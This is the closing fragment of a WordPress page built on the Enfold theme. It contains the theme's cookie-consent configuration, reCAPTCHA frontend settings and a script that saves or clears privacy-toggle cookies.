var AviaPrivacyCookieConsent = {"?":"Usage unknown","aviaCookieConsent":"Use and storage of Cookies has been accepted - restrictions set in other cookies","aviaPrivacyRefuseCookiesHideBar":"Hide cookie message bar on following page loads and refuse cookies if not allowed - aviaPrivacyEssentialCookiesEnabled must be set","aviaPrivacyEssentialCookiesEnabled":"Allow storage of site essential cookies and other cookies and use of features if not opt out","aviaPrivacyVideoEmbedsDisabled":"Do not allow video embeds","aviaPrivacyGoogleTrackingDisabled":"Do not allow Google Analytics","aviaPrivacyGoogleWebfontsDisabled":"Do not allow Google Webfonts","aviaPrivacyGoogleMapsDisabled":"Do not allow Google Maps","aviaPrivacyGoogleReCaptchaDisabled":"Do not allow Google reCaptcha","aviaPrivacyMustOptInSetting":"Settings are for users that must opt in for cookies and services","PHPSESSID":"Operating site internal cookie - Keeps track of your session","XDEBUG_SESSION":"Operating site internal cookie - PHP Debugger session cookie","wp-settings*":"Operating site internal cookie","wordpress*":"Operating site internal cookie","tk_ai*":"Shop internal cookie","woocommerce*":"Shop internal cookie","wp_woocommerce*":"Shop internal cookie","wp-wpml*":"Needed to manage different languages"};
var AviaPrivacyCookieAdditionalData = {"cookie_refuse_button_alert":"When refusing all cookies this site might not be able to work as expected. Please check our settings page and opt out for cookies or functions you do not want to use and accept cookies. You will be shown this message every time you open a new window or a new tab.\n\nAre you sure you want to continue?","no_cookies_found":"No accessable cookies found in domain","admin_keep_cookies":["PHPSESSID","wp-*","wordpress*","XDEBUG*"],"remove_custom_cookies":[],"no_lightbox":"We need a lightbox to show the modal popup. Please enable the built in lightbox in Theme Options Tab or include your own modal window plugin.\\n\\nYou need to connect this plugin in JavaScript with callback wrapper functions - see avia_cookie_consent_modal_callback in file enfold\\js\\avia-snippet-cookieconsent.js "};var AviaReCAPTCHA_front = {"version":"avia_recaptcha_v2","site_key2":"6LcDbpYUAAAAAJQvQuN2Hy24NaTws77QKO-yd0PV","site_key3":"6LcDbpYUAAAAAJQvQuN2Hy24NaTws77QKO-yd0PV","api":"https:\/\/www.google.com\/recaptcha\/api.js","api_lang":"en","avia_api_script":"\/wp-content\/themes\/enfold\/framework\/js\/conditional_load\/avia_google_recaptcha_api.js","theme":"light","score":"0.5","verify_nonce":"8aeb61435b","cannot_use":"<h3 class=\"av-recaptcha-error-main\">Sorry, a problem occurred trying to communicate with Google reCAPTCHA API. You are currently not able to submit the contact form. Please try again later - reload the page and also check your internet connection.<\/h3>","init_error_msg":"Initial setting failed. Sitekey 2 and\/or sitekey 3 missing in frontend.","v3_timeout_pageload":"Timeout occurred connecting to V3 API on initial pageload","v3_timeout_verify":"Timeout occurred connecting to V3 API on verifying submit","v2_timeout_verify":"Timeout occurred connecting to V2 API on verifying you as human. Please try again and check your internet connection. It might be necessary to reload the page.","verify_msg":"Verify....","connection_error":"Could not connect to the internet. Please reload the page and try again.","validate_first":"Please validate that you are a human first","validate_submit":"Before submitting we validate that you are a human first.","no_token":"Missing internal token on valid submit - unable to proceed.","invalid_version":"Invalid reCAPTCHA version found.","api_load_error":"Google reCAPTCHA API could not be loaded."};
/* ]]> */
</script>
<script type="text/javascript" src="/wp-content/uploads/dynamic_avia/avia-footer-scripts-9794f12cc639c634ae6c80d6d24e7c2d---6433e3f4ea3bd.js" id="avia-footer-scripts-js"></script>
<script type="text/javascript">function av_privacy_cookie_setter( cookie_name ){var cookie_check = jQuery('html').hasClass('av-cookies-needs-opt-in') || jQuery('html').hasClass('av-cookies-can-opt-out');var toggle = jQuery('.' + cookie_name);toggle.each(function(){var container = jQuery(this).closest('.av-toggle-switch');if( cookie_check && ! document.cookie.match(/aviaCookieConsent/) ){this.checked = container.hasClass( 'av-cookie-default-checked' );}else if( cookie_check && document.cookie.match(/aviaCookieConsent/) && ! document.cookie.match(/aviaPrivacyEssentialCookiesEnabled/) && cookie_name != 'aviaPrivacyRefuseCookiesHideBar' ){if( cookie_name == 'aviaPrivacyEssentialCookiesEnabled' ){this.checked = false;}else{this.checked = container.hasClass( 'av-cookie-default-checked' );}}else{if( container.hasClass('av-cookie-save-checked') ){this.checked = document.cookie.match(cookie_name) ? true : false;}else{this.checked = document.cookie.match(cookie_name) ? false : true;}}});jQuery('.' + 'av-switch-' + cookie_name).addClass('active');toggle.on('click', function(){/* sync if more checkboxes exist because user added them to normal page content */var check = this.checked;jQuery('.' + cookie_name).each( function(){this.checked = check;});var silent_accept_cookie = jQuery('html').hasClass('av-cookies-user-silent-accept');if( ! silent_accept_cookie && cookie_check && ! document.cookie.match(/aviaCookieConsent/) || sessionStorage.getItem( 'aviaCookieRefused' ) ){return;}var container = jQuery(this).closest('.av-toggle-switch');var action = '';if( container.hasClass('av-cookie-save-checked') ){action = this.checked ? 'save' : 'remove';}else{action = this.checked ? 'remove' : 'save';}if('remove' == action){document.cookie = cookie_name + '=; Path=/; Expires=Thu, 01 Jan 1970 00:00:01 GMT;';}else{var theDate = new Date();var oneYearLater = new Date( theDate.getTime() + 31536000000 );document.cookie = cookie_name + '=true; Path=/; Expires='+oneYearLater.toGMTString()+';';}});}; av_privacy_cookie_setter('aviaPrivacyRefuseCookiesHideBar');  av_privacy_cookie_setter('aviaPrivacyEssentialCookiesEnabled');  av_privacy_cookie_setter('aviaPrivacyGoogleWebfontsDisabled');  av_privacy_cookie_setter('aviaPrivacyGoogleMapsDisabled');  av_privacy_cookie_setter('aviaPrivacyGoogleReCaptchaDisabled');  av_privacy_cookie_setter('aviaPrivacyVideoEmbedsDisabled');</script>
</body>
</html>